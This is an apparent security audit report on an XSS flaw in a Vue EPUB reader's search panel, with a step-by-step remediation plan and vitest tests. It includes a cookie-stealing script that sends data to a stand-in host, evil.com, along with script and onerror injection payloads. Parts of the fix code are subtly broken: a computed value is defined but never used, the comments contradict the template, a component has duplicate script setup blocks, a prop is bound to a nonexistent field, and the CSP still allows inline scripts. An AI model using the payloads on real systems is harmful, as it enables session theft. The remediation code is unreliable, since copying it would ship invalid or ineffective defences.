# XSS Vulnerability via Unsafe v-html in SearchPanel Component

## Severity
High

## Affected Files
- `src/components/SearchPanel.vue:131`
- `src/composables/useSearch.ts:52-55`

## Description
The `SearchPanel.vue` component uses `v-html` to render search result excerpts without any sanitization. The search excerpts are generated from untrusted EPUB content that may contain malicious HTML tags or scripts.

```vue
<!-- Line 131 in SearchPanel.vue -->
<p 
  class="text-sm text-gray-600 dark:text-gray-400 line-clamp-2"
  v-html="result.excerpt"
/>
```

The `excerpt` field is generated in `useSearch.ts` by wrapping matched text with `<mark>` tags:
```typescript
// Lines 52-55 in useSearch.ts
excerpt = excerpt.replace(
  new RegExp(`(${escapeRegex(searchQuery)})`, 'gi'),
  '<mark>$1</mark>'
);
```

This means that if the EPUB chapter content contains malicious HTML, it will be directly rendered in the search panel, allowing XSS attacks.

## Potential Attack Vectors
1. **Script Injection**: EPUB content with `<script>alert(1)</script>` will execute in the search panel
2. **Event Handler Injection**: Malicious `<img src=x onerror="alert(1)">` tags will trigger
3. **Link Phishing**: Links in search results can redirect users to malicious sites
4. **Data Theft**: Scripts can steal IndexedDB data, localStorage, or cookies
5. **Form Injection**: Attackers can inject forms that capture user input

### Example Malicious Search Result
If an EPUB chapter contains:
```html
<p>This book explains how to <script>fetch('https://evil.com/steal?data='+btoa(document.cookie))</script> learn security.</p>
```

When a user searches for "security", the search result excerpt will render the malicious script.

## Implementation Plan

### Step 1: Install DOMPurify (if not already installed)
```bash
npm install dompurify
npm install --save-dev @types/dompurify
```

### Step 2: Create a sanitization utility
Create `src/utils/sanitize.ts`:
```typescript
import DOMPurify from 'dompurify';

const SEARCH_ALLOWED_TAGS = ['mark'];
const SEARCH_ALLOWED_ATTR = ['class'];

export function sanitizeSearchExcerpt(dirty: string): string {
  return DOMPurify.sanitize(dirty, {
    ALLOWED_TAGS: SEARCH_ALLOWED_TAGS,
    ALLOWED_ATTR: SEARCH_ALLOWED_ATTR,
    KEEP_CONTENT: true,
    FORCE_BODY: false
  });
}
```

### Step 3: Update useSearch.ts to sanitize excerpts
Modify `src/composables/useSearch.ts`:
```typescript
import { sanitizeSearchExcerpt } from '@/utils/sanitize';

// ... in searchInBook function ...

// After generating excerpt with mark tags
excerpt = excerpt.replace(
  new RegExp(`(${escapeRegex(searchQuery)})`, 'gi'),
  '<mark>$1</mark>'
);

// SANITIZE EXCERPT BEFORE STORING
excerpt = sanitizeSearchExcerpt(excerpt);

searchResults.push({
  chapterIndex: i,
  chapterTitle: chapter.title,
  excerpt,  // Now sanitized
  cfi: chapter.href,
  searchText: searchQuery,
  matchedText,
  matchIndex: resultsInChapter,
});
```

### Step 4: Update SearchPanel.vue to use text instead of v-html
Replace the unsafe `v-html` with a safer approach using a computed property or custom component:

**Option A: Use safe text rendering with HTML entities**
```vue
<!-- In SearchPanel.vue -->
<script setup lang="ts">
import { computed } from 'vue';

// ... existing code ...

const safeExcerpts = computed(() => {
  return search.results.value.map(result => ({
    ...result,
    excerpt: result.excerpt
      // Only allow <mark> tags, encode everything else
      .replace(/&/g, '&amp;')
      .replace(/</g, '&lt;')
      .replace(/>/g, '&gt;')
      // Restore allowed <mark> tags
      .replace(/&lt;mark&gt;/g, '<mark>')
      .replace(/&lt;\/mark&gt;/g, '</mark>')
  }));
});
</script>

<template>
  <!-- ... existing template ... -->
  <button
    v-for="(result, index) in search.results.value"
    :key="index"
    @click="goToResult(result)"
    class="w-full text-left p-3 rounded-lg hover:bg-gray-100 dark:hover:bg-gray-700 transition-colors"
  >
    <p class="font-medium text-sm mb-1" :class="themeClasses.text">
      {{ result.chapterTitle }}
    </p>
    <!-- Use v-text or just {{ }} interpolation instead of v-html -->
    <p 
      class="text-sm text-gray-600 dark:text-gray-400 line-clamp-2"
      v-html="sanitizeSearchExcerpt(result.excerpt)"
    />
  </button>
  <!-- ... -->
</template>

<script setup lang="ts">
import { sanitizeSearchExcerpt } from '@/utils/sanitize';
</script>
```

### Step 5: Alternative - Create a HighlightText component
Create `src/components/HighlightText.vue`:
```vue
<script setup lang="ts">
import { computed } from 'vue';

const props = defineProps<{
  text: string;
  highlight?: string;
}>();

const highlightedText = computed(() => {
  if (!props.highlight) {
    return props.text;
  }
  
  // Escape HTML first
  const escaped = props.text
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;');
  
  // Then apply highlight tags
  const regex = new RegExp(`(${escapeRegex(props.highlight)})`, 'gi');
  return escaped.replace(regex, '<mark class="bg-yellow-200 dark:bg-yellow-800">$1</mark>');
});

function escapeRegex(string: string): string {
  return string.replace(/[.*+?^${}()|[\]\\]/g, '\\$&');
}
</script>

<template>
  <span v-html="highlightedText"></span>
</template>
```

Then in SearchPanel.vue:
```vue
<HighlightText :text="result.chapterContent" :highlight="searchQuery" />
```

### Step 6: Add Content Security Policy for search panel
Update the CSP meta tag in `index.html`:
```html
<meta http-equiv="Content-Security-Policy" 
      content="default-src 'self'; 
               script-src 'self' 'unsafe-inline'; 
               style-src 'self' 'unsafe-inline'; 
               img-src 'self' blob: data: https:;
               connect-src 'self'; 
               font-src 'self' data:;
               object-src 'none';
               base-uri 'self';">
```

### Step 7: Add tests for search sanitization
Create `tests/search-sanitize.test.ts`:
```typescript
import { describe, it, expect } from 'vitest';
import { sanitizeSearchExcerpt } from '@/utils/sanitize';

describe('sanitizeSearchExcerpt', () => {
  it('should preserve mark tags for highlighting', () => {
    const input = 'This is <mark>highlighted</mark> text.';
    const output = sanitizeSearchExcerpt(input);
    expect(output).toContain('<mark>highlighted</mark>');
  });

  it('should remove script tags', () => {
    const input = 'Text with <script>alert(1)</script> script.';
    const output = sanitizeSearchExcerpt(input);
    expect(output).not.toContain('<script');
    expect(output).toContain('Text with');
  });

  it('should remove event handlers', () => {
    const input = '<img src=x onerror=alert(1)> and text';
    const output = sanitizeSearchExcerpt(input);
    expect(output).not.toContain('onerror');
  });

  it('should preserve allowed mark attributes', () => {
    const input = '<mark class="search-highlight">text</mark>';
    const output = sanitizeSearchExcerpt(input);
    expect(output).toContain('class="search-highlight"');
  });

  it('should remove dangerous tags', () => {
    const input = '<iframe src="evil.com"></iframe> content';
    const output = sanitizeSearchExcerpt(input);
    expect(output).not.toContain('<iframe');
  });
});
```

## Additional Recommendations
1. Consider using a separate sandboxed iframe for rendering search results if you need rich HTML
2. Implement content-length limits for search excerpts to prevent DoS
3. Add rate limiting for search queries to prevent abuse
4. Consider server-side preprocessing of EPUB content (if you add a backend)
5. Add security headers in build configuration for production builds

## Related Issues
- See also: `xss-via-unsafe-innerhtml-bookviewer.md` (main content sanitization)
- See also: `xss-via-unsafe-epub-content-useepub.md` (EPUB processing)
